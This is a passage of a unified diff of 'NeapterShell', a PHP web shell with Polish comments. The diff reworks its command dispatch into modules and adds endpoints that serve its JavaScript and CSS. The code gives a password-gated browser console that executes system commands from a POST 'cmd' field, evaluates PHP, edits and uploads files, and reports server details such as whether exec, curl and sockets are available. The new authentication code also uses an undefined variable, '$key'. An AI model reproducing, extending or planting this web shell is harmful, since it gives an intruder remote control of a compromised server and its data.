-            htmlspecialchars(Request::getPost('cmd'))
-        );
-    }
-
-    /**
-     * Wykonanie polecenia systemowago
-     *
-     * @access public
-     * @param  string $sCmd Komenda
-     * @return string
-     */
-    private function getCommandInfo()
-    {
-        /**
-         * Help
-         */
-        if ($this->bHelp) {
-            return <<<DATA
-info - Wyświetla informacje o systemie
-
-	Użycie:
-		info
-DATA;
-        }
-
-        return sprintf("- SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%d]",
-            php_uname(),
-            ($sIp = Request::getServer('REMOTE_ADDR')),
-            gethostbyaddr($sIp),
-            PHP_VERSION,
-            php_sapi_name(),
-            ((PHP_SAPI === 'cli') ? 'CLI' : Request::getCurrentUrl()),
-            ((PHP_SAPI === 'cli') ? Request::getServer('PWD') . '/' : '') . Request::getServer('SCRIPT_FILENAME'),
-            $this->bSafeMode,
-            $this->bExec,
-            function_exists('curl_init'),
-            function_exists('socket_create')
+            $this->oUtils->getTmpDir(),
+            (($sDisableFunctions = implode(',', $this->oUtils->getDisabledFunctions()) === '') ? 'Brak' : $sDisableFunctions)
         );
     }
 
@@ -1312,12 +345,6 @@ DATA;
     public function getActionBrowser($sCmd = NULL)
     {
         $bRaw = ($sCmd !== NULL);
-
-        /**
-         * Wlasna zawartosc strony; domyslnie znajduje sie okno konsoli
-         * linia polecen i przycisk 'Execute'
-         */
-        $bOwnContent = FALSE;
 
         /**
          * Zawartosc strony
@@ -1345,7 +372,7 @@ DATA;
             } else if (Request::getPost('cmd') === FALSE) {
                 $sCmd = ':ls -l ' . dirname(Request::getServer('SCRIPT_FILENAME'));
             } else {
-                $sCmd = (string)Request::getPost('cmd');
+                $sCmd = (string) Request::getPost('cmd');
             }
         }
         /**
@@ -1355,127 +382,57 @@ DATA;
             if (($iPos = strpos($sCmd, ' ') - 1) !== -1) {
                 $this->sCmd = substr($sCmd, 1, $iPos);
             } else {
-                $this->sCmd = (string)substr($sCmd, 1);
+                $this->sCmd = (string) substr($sCmd, 1);
             }
 
             $this->oArgs = new Args(ltrim(preg_replace(sprintf('~^\:%s[\s+]?~', $this->sCmd), NULL, $sCmd)));
 
+            $aModules = $this->oUtils->getCommands();
+
             /**
              *  Lista komend i aliasy
              */
-            switch ($this->sCmd) {
-                case 'help':
-                    $sConsole = $this->getCommandHelp();
-                    break;
-                case 'cd':
-                    $sConsole = $this->getCommandCd();
-                    break;
-                case 'modules':
-                    $sConsole = $this->getCommandModules();
-                    break;
-                case 'cr3d1ts':
-                    $sConsole = $this->getCommandCr3d1ts();
-                    break;
-                case 'system':
-                case 'exec':
-                    $sConsole = $this->getCommandSystem($this->sArgv);
-                    break;
-                case 'info':
-                    $sConsole = $this->getCommandInfo();
-                    break;
-                case 'autoload':
-                    $sConsole = $this->getCommandAutoload();
-                    break;
-                case 'eval':
-                case 'php':
-                    $sConsole = $this->getCommandEval();
-                    break;
-                case 'version':
-                    $sConsole = $this->getCommandVersion();
-                    break;
-                case 'exit':
-                case 'quit':
-                case 'logout':
-                    $sConsole = $this->getCommandLogout();
-                    break;
-                case 'edit':
-                    $mContent = $this->getCommandEdit($this->sArgv);
+            if ($aModules === array()) {
+                $sConsole = 'Nie wczytano żadnych modułów !!!';
+            } else if (isset($aModules[$this->sCmd])) {
+                $sModule = $aModules[$this->sCmd];
+                $oModule = new $sModule($this, $this->oUtils, $this->oArgs);
 
-                    if (is_bool($mContent)) {
-                        $sConsole = sprintf('Plik %szostał zapisany', (!$mContent ? 'nie ' : NULL));
-                    } /**
-                     * Help
-                     */
-                    else if (strncmp($mContent, '<form', 5) !== 0) {
-                        $sConsole = $mContent;
-                    } /**
-                     * Formularz sluzacy do edycji pliku
-                     */
-                    else {
-                        $bOwnContent = TRUE;
-                        $sContent = $mContent;
-                    }
-                    break;
-                case 'upload':
-                    $mContent = $this->getCommandUpload($this->sArgv);
+                if (($this->oArgs->getNumberOfParams() === 1) && ($this->oArgs->getParam(0) === 'help')) {
+                    $sHelp = $sModule::getHelp();
 
-                    if (is_bool($mContent)) {
-                        $sConsole = sprintf('Plik %szostał wrzucony', (!$mContent ? 'nie ' : NULL));
-                    } /**
-                     * Help
-                     */
-                    else if (strncmp($mContent, '<form', 5) !== 0) {
-                        $sConsole = $mContent;
-                    } /**
-                     * Formularz sluzacy do wrzucenia pliku
-                     */
-                    else {
-                        $bOwnContent = TRUE;
-                        $sContent = $mContent;
-                    }
-                    break;
-                default :
-                    if ($this->aModules === array()) {
-                        $sConsole = 'Nie wczytano żadnych modułów !!!';
-                    } else if (array_key_exists($this->sCmd, $this->aModules)) {
-                        $sModule = $this->aModules[$this->sCmd];
-                        $oModule = new $sModule($this);
-
-                        if (($this->oArgs->getNumberOfParams() === 1) && ($this->oArgs->getParam(0) === 'help')) {
-                            $sConsole = $this->aHelpModules[$sModule] . ' - ' . $oModule->getHelp();
-                        } else {
-                            $sConsole = $oModule->get();
-                        }
-                    } else {
-                        $sConsole = sprintf('Nie ma takiego polecenia "%s"', htmlspecialchars($this->sCmd));
-                    }
+                    $sConsole = implode(', ', $this->oUtils->getCommandsByModule($sModule)) . ' - ' . $sHelp;
+                } else {
+                    $sConsole = $oModule->get();
+                }
+            } else {
+                $sConsole = sprintf('Nie ma takiego polecenia "%s"', htmlspecialchars($this->sCmd));
             }
         } elseif ($sCmd === '') {
             $sConsole = 'Wpisz ":help", by zobaczyć pomoc';
-        } /**
+        }
+        /**
          * Wykonanie komendy systemowej
          */
-        else {
-            $sConsole = $this->getCommandSystem($sCmd);
+        else if (class_exists('ModuleSystem')) {
+            $this->setArgs($sCmd);
+            $oSystem = new ModuleSystem($this, $this->oUtils, $this->oArgs);
+
+            $sConsole = $oSystem->get();
         }
 
         if ($bRaw || (PHP_SAPI === 'cli')) {
             return htmlspecialchars_decode($sConsole) . "\r\n";
         }
 
-        /**
-         * Wlasna zawartosc okna
-         */
-        if (!$bOwnContent) {
-            $sContent = sprintf('<pre id="console">%s</pre><br/>' .
-                '<form action="%s" method="post">' .
-                '<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="off"/>' .
-                '<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
-                $sConsole,
-                Request::getCurrentUrl(),
-                htmlspecialchars(((($sVal = Request::getPost('cmd')) !== FALSE) ? $sVal : (string)$sCmd))
-            );
-        }
+        $sContent = sprintf('<pre id="console">%s</pre><br/>' .
+            '<form action="%s" method="post">' .
+            '<input type="text" name="cmd" value="%s" size="110" id="cmd" autocomplete="on"/>' .
+            '<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
+            $sConsole,
+            Request::getCurrentUrl(),
+            htmlspecialchars(((($sVal = Request::getPost('cmd')) !== FALSE) ? $sVal : (string) $sCmd))
+        );
 
         return $this->getContent($sContent);
     }
@@ -1505,24 +462,46 @@ DATA;
             return $aMatch[1];
         }
 
-        $sScript = file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Lib/js.js');
-
         /**
          * Wylaczenie JavaScript
          */
-        if ($this->bNoJs) {
-            $sScript = NULL;
+        $sScript = NULL;
+        if (!$this->bNoJs) {
+            $sScript = '<script src="./?js"></script>';
         }
 
         $sMenu = $this->getMenu();
         $sGeneratedIn = sprintf('%.5f', microtime(1) - $this->fGeneratedIn);
         $sTitle = sprintf('NeapterShell @ %s (%s)', Request::getServer('HTTP_HOST'), Request::getServer('SERVER_ADDR'));
         $sVersion = self::VERSION;
-        return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body><div id=\"body\">" .
+        return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><link href=\"./?css\" type=\"text/css\" media=\"all\" rel=\"stylesheet\"/></head><body><div id=\"body\">" .
         ($bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL) .
         "<div id=\"content\">{$sData}</div></div>" .
         ($bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL) .
         "</div>{$sScript}</body></html>";
+    }
+
+    protected function getHttpCacheHeaders()
+    {
+        header('Expires: '. date('D, d M Y H:i:s \G\M\T', time() + (3600*24*365)));
+    }
+
+    protected function getJs()
+    {
+        header('Content-type: application/javascript');
+        $this->getHttpCacheHeaders();
+
+        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Lib/js.js');
+        exit;
+    }
+
+    protected function getCss()
+    {
+        header('Content-type: text/css');
+        $this->getHttpCacheHeaders();
+
+        echo file_get_contents(dirname(Request::getServer('SCRIPT_FILENAME')) . '/Styles/haxior.css');;
+        exit;
     }
 
     /**
@@ -1533,19 +512,28 @@ DATA;
      */
     public function get()
     {
+        if (isset($_GET['js'])) {
+            $this->getJs();
+        }
+
+        if (isset($_GET['css'])) {
+            $this->getCss();
+        }
+
         /**
          * Uwierzytelnianie
          */
         if ((PHP_SAPI !== 'cli') && ($this->sAuth !== NULL)) {
             $sAuth = NULL;
 
-            if (is_file($sAuthFilename = $this->sTmp . '/' . $this->sPrefix . md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth')
-                && (($sData = file_get_contents($sAuthFilename)) !== FALSE)
-            ) {
-                $sAuth = $this->decode($sData);
-            }
+            $sKey = md5(Request::getServer('REMOTE_ADDR') . Request::getServer('USER_AGENT')) . '_auth';
 
-            if ($sAuth !== sha1($this->sAuth . Request::getServer('REMOTE_ADDR'), TRUE)) {
+            $sAuth = $this->oUtils->cacheGet($key);
+
+            $sPassword = sha1($this->sAuth . Request::getServer('REMOTE_ADDR'), TRUE);
+
+
+            if ($sAuth !== $sPassword) {
                 /**
                  * Sprawdzanie poprawnosci sha1( "user\xffpass" );
                  */
@@ -1560,7 +548,7 @@ DATA;
                     return;
                 }
 
-                file_put_contents($sAuthFilename, $this->encode(sha1($this->sAuth . Request::getServer('REMOTE_ADDR'), TRUE)));
+                $this->oUtils->cacheSet($sKey, $sPassword);
             }
         }
 
@@ -1589,29 +577,27 @@ DATA;
         echo $this->getActionBrowser();
     }
 
-    public function getArgs()
-    {
-        return $this->oArgs;
-    }
-
-    public function isSafeMode()
-    {
-        return $this->bSafeMode;
-    }
-
-    public function isWindows()
-    {
-        return $this->bWindows;
-    }
-
-    public function isExecutable()
-    {
-        return $this->bExec;
-    }
-
+    /**
+     * Set command to execute
+     *
+     * @param string $sArgs Command to execute
+     * @return void
+     */
     public function setArgs($sArgs)
     {
         $this->oArgs = new Args(preg_replace('~^:[^ ]+\s+~', NULL, $sArgs));
+    }
+
+    /**
+     * Set developer mode ON or OFF
+     *
+     * @param  boolean $bValue On or off
+     * @return void
+     */
+    protected function setDev($bValue)
+    {
+        $this->bDev = (bool) $bValue;
+        $this->loadDevConfig();
     }
 
 }
